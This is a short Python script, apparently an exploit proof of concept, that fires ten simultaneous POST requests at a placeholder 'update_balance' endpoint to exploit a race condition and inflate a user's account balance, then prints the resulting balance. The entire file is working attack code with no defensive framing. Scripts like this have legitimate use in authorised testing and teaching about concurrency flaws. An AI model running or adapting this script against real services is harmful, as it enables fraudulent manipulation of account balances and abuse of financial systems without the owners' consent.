import threading
import time
import requests

# Target URL for vulnerable endpoint
TARGET_URL = 'http://vulnerable-website.com/update_balance'

# Example payloads
USER_ID = '123'
UPDATE_AMOUNT = 100

def send_race_condition_request(user_id, amount):
    # Simulate a balance update request
    response = requests.post(TARGET_URL, data={'user_id': user_id, 'amount': amount})
    return response

def perform_race_condition_attack():
    # Create a list of threads to simulate concurrent requests
    threads = []
    for _ in range(10):  # Simulating 10 concurrent requests
        thread = threading.Thread(target=send_race_condition_request, args=(USER_ID, UPDATE_AMOUNT))
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    # Check the result (e.g., checking if balance is updated incorrectly)
    balance_response = requests.get(f'{TARGET_URL}?user_id={USER_ID}')
    print(f"Balance after race condition attack: {balance_response.text}")

perform_race_condition_attack()
